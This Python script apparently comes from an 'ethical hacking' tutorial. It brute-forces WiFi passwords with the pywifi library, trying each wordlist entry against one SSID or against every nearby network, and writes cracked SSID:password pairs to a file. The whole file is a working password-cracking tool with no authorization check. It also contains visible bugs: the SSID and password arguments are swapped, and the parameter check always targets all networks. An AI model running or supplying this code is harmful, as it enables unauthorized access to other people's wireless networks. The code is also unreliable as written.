# https://medium.com/analytics-vidhya/wifi-hacking-using-pywifi-4f90ed9b1a2
###############################################################################################################

# Github Repo For Hacking Stuff --> https://github.com/r-sajal/Ethical-Hacking/

###############################################################################################################
# Importing General Libraries
import logging
import os, os.path, platform
import sys
import time

# Importing pywifi library
from pywifi import const
from pywifi import Profile

import colorama

from helpers.argparser import get_argument_parser
from helpers.abstractfile import get_filehandle

colorama.init()

import helpers.wifi
from helpers.constants import *

# Change According to needs -->
# cient_ssid == name of the wifi which you want to hack
# path to already created brute force password file

# client_ssid = "Dfone"
# path_to_file = "data/wifi-passwords.txt"
# path_to_file = "data/passwords.txt"

################################################################################

# noinspection PyArgumentList
logging.basicConfig(
    level=logging.ERROR,
    format="%(levelname)s | %(message)s",
    stream=sys.stdout,
    force=True,
)


# logging.getLogger('pywifi').setLevel(logging.NOTSET)

# type = False

def create_profile(
        ssid,
        password,
        auth=const.AUTH_ALG_OPEN,
        akm=const.AKM_TYPE_WPA2PSK,
        cipher=const.CIPHER_TYPE_CCMP
):
    profile = Profile()  # create profile instance
    profile.ssid = ssid  # name of client
    profile.auth = auth  # auth algo
    profile.akm.append(akm)  # key management
    profile.cipher = cipher  # type of cipher
    profile.key = password  # use generated password
    return profile


def reset_profiles(wifi, number, verbose):
    if verbose:
        print(DARK_GREEN)
        print(PLUS, f"[{number}] total network profiles: ", len(wifi.iface.network_profiles()))
        print(PLUS, f"[{number}] remove_all_network_profiles")
    wifi.iface.remove_all_network_profiles()  # remove all the profiles which are previously connected to device
    if verbose:
        print(PLUS, f"[{number}] total network_profiles: ", len(wifi.iface.network_profiles()))


def add_profile(wifi, number, profile):
    print(GREEN, end="")
    print(PLUS, f"[{number}] adding profile:")
    tmp_profile = wifi.iface.add_network_profile(profile)  # add new profile
    time.sleep(1)  # if script not working change time to 1 !!!!!!
    return tmp_profile


def dump_profile(profile):
    print(DARK_GREEN)
    for var in vars(profile):
        print(f"{var:15}: {getattr(profile, var)}")


def crack_password(wifi, ssid, password, number, verbose=False):
    # profile management
    profile = create_profile(password, ssid)
    reset_profiles(wifi, number, verbose)
    tmp_profile = add_profile(wifi, number, profile)
    if verbose:
        dump_profile(tmp_profile)

    #   connect
    print(GREEN, end="")
    print(PLUS, f"[{number}] connecting...")
    wifi.iface.connect(tmp_profile)  # trying to Connect
    time.sleep(1)  # 1s

    # wait and check
    if wifi.iface.status() == const.IFACE_CONNECTED:  # checker
        # sucess
        # time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        wifi.iface.disconnect()
        time.sleep(1)
        return True
    else:
        #   fail
        print(LIGHT_RED, '[{}] Crack Failed using {}'.format(number, password))
        return False


# opening and reading the file
def crack_loop(ssid, password_file, output_file, from_password, to_password, verbose):
    wifi = helpers.wifi.Wifi(verbose)

    print(YELLOW)
    print(TILDE, "Cracking...")

    print(GREEN)
    print("setting target ssid to: ", end="")
    if ssid == "*ALL*":
        ssids = [network.ssid for network in wifi.networks]
    else:
        ssids = [ssid]
    print(ssids)

    attempts = 0
    words = get_filehandle(password_file)
    for line in words:
        #   get next password
        try:
            # url / ssh
            pwd = line.decode('utf-8').strip().strip('\r').strip('\n')
        except:
            # file
            pwd = line.strip().strip('\r').strip('\n')

        if pwd < from_password:
            print(f"{pwd} < {from_password}: skipping")
            continue

        if pwd > to_password:
            print(f"{pwd} > {to_password}: terminating")
            exit()

        #   count attempts
        attempts += 1

        # loop over ssids
        for ssid in ssids:
            print(YELLOW)
            print(f"[{attempts}] Trying {ssid} with {pwd}")
            # try to crack
            if crack_password(wifi, ssid, pwd, attempts, verbose=False):
                # save cracked data
                print(DARK_WHITE, f"saving {ssid}:{pwd} to {output_file}")
                with open(output_file, 'a') as out:
                    out.write(f"{ssid}:{pwd}")
                # update ssid list
                print(f"removing {ssid} from loop")
                ssids.remove(ssid)
    words.close()


def check_params():
    parser = get_argument_parser()
    args = parser.parse_args()

    all = args.all
    ssid = args.ssid
    password_file = args.passwordfile
    output_file = args.outputfile
    from_password = args.frompassword
    to_password = args.topassword
    verbose = args.verbose
    #
    #   one ssid or -a must be specified
    #
    if not any((ssid, all)):
        print(RED, MINUS, "one of ssid/all must be specified")
        exit()
    else:
        print(YELLOW, PLUS, "setting loop for all networks")
        ssid = "*ALL*"

    print(DARK_CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
    print(CYAN, PLUS, f"ssid         : {ssid}")
    print(CYAN, PLUS, f"password file: {password_file}")
    print(CYAN, PLUS, f"output_file  : {output_file}")
    print(CYAN, PLUS, f"from_password: {from_password}")
    print(CYAN, PLUS, f"to_password  : {to_password}")
    print(CYAN, PLUS, f"verbose      : {verbose}")
    print(RESET)
    time.sleep(1.5)
    return ssid, password_file, output_file, from_password, to_password, verbose


if __name__ == '__main__':
    # Main function call
    ssid, password_file, output_file, from_password, to_password, verbose = check_params()
    crack_loop(ssid, password_file, output_file, from_password, to_password, verbose)

###########################################################################################################################################################
# END OF FILE

# Code by Sajal Rastogi

###########################################################################################################################################################
